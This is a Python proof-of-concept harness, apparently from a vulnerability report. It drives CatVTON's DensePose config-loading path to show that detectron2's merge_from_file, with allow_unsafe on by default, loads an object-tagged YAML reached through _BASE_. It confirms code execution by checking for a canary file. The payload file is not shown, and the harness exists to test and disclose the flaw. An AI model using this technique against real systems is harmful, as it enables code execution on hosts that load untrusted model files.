#!/usr/bin/env python3
"""
run_poc.py -- drive the product's real DensePose config-loading path.

    python run_poc.py attack     # _BASE_ selects the object-tag document
    python run_poc.py control    # _BASE_ selects the plain document

What is REAL here
-----------------
* `detectron2/config/config.py`  -- executed verbatim from the pinned CatVTON
  tree (poc/CatVTON-7818397), commit 7818397f25613beedb3d861a34769f607cfcf3b1.
  `CfgNode.merge_from_file()` (line 37) is the vulnerable function; its
  `allow_unsafe: bool = True` default is what the attacker relies on.
* `densepose/config.py`          -- executed verbatim from the same tree; this is
  the `add_densepose_config()` that `model/DensePose/__init__.py:47` calls.
* `fvcore==0.1.5.post20221221`   -- the pinned version from requirements.txt;
  `CfgNode.load_yaml_with_base()` does the `_BASE_` recursion and the
  safe_load -> unsafe_load fallback.
* The two YAML documents           -- the files actually shipped by the
  Hugging Face repo `zhengchong/CatVTON` under `DensePose/`.

The statement sequence below is exactly `DensePose.setup_config()`
(model/DensePose/__init__.py:44-52), minus `cfg.freeze()` and the
`DefaultPredictor` construction that follows it -- detectron2's compiled
`_C` ops are not built on this host, so the run stops right after the
attacker-controlled document has been loaded.

What is stubbed
---------------
* `densepose/__init__.py` is not executed (it pulls in torch model code and
  detectron2's compiled ops).  The real `densepose/config.py` source is loaded
  directly by file path instead.
"""

import importlib.util
import logging
import os
import sys
import types

import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.join(HERE, "CatVTON-7818397")
WORK = os.path.join(HERE, "work")

TOP_YAML = "densepose_rcnn_R_50_FPN_s1x.yaml"


def load_real_densepose_config(repo):
    """Execute the pinned `densepose/config.py` without running the package
    `__init__` (which needs detectron2's compiled extension)."""
    pkg = types.ModuleType("densepose")
    pkg.__path__ = [os.path.join(repo, "densepose")]
    pkg.__package__ = "densepose"
    sys.modules["densepose"] = pkg
    path = os.path.join(repo, "densepose", "config.py")
    spec = importlib.util.spec_from_file_location("densepose.config", path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["densepose.config"] = mod
    spec.loader.exec_module(mod)
    return mod


def main(argv):
    if len(argv) != 2 or argv[1] not in ("attack", "control"):
        sys.exit("usage: python run_poc.py attack|control")
    mode = argv[1]

    logging.basicConfig(level=logging.WARNING, format="%(levelname)s %(name)s: %(message)s")

    model_dir = os.path.join(WORK, mode, "DensePose")
    config_path = os.path.join(model_dir, TOP_YAML)
    canary = os.path.abspath(os.path.join(WORK, mode, "canary_%s.txt" % mode))
    if os.path.exists(canary):
        os.remove(canary)

    # The marker path travels through the environment so that the two
    # secondary documents stay byte-identical between attack and control.
    os.environ["CANARY"] = canary

    print("mode                : %s" % mode)
    print("model dir           : %s" % os.path.relpath(model_dir, HERE))
    print("config opened       : %s" % TOP_YAML)
    with open(config_path, "r", encoding="utf-8") as fh:
        top = yaml.safe_load(fh)
    print("top-level _BASE_    : %r" % top["_BASE_"])

    sys.path.insert(0, REPO)
    from detectron2.config import get_cfg  # noqa: E402  (pinned vendored copy)

    dp = load_real_densepose_config(REPO)

    # ---- DensePose.setup_config(), model/DensePose/__init__.py:44-52 --------
    cfg = get_cfg()
    dp.add_densepose_config(cfg)
    cfg.merge_from_file(config_path)          # <-- vulnerable call, line 48
    # ------------------------------------------------------------------------

    print("merge_from_file     : returned, cfg.MODEL.ROI_HEADS.NUM_CLASSES = %r"
          % cfg.MODEL.ROI_HEADS.NUM_CLASSES)
    print("cfg.SOLVER.MAX_ITER : %r" % cfg.SOLVER.MAX_ITER)

    hit = os.path.exists(canary)
    print("canary path         : %s" % os.path.relpath(canary, HERE))
    print("canary created      : %s" % hit)
    if hit:
        with open(canary, "r", encoding="utf-8", errors="replace") as fh:
            print("canary content      : %r" % fh.read().strip())

    want = (mode == "attack")
    ok = (hit == want)
    print("RESULT              : %s" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
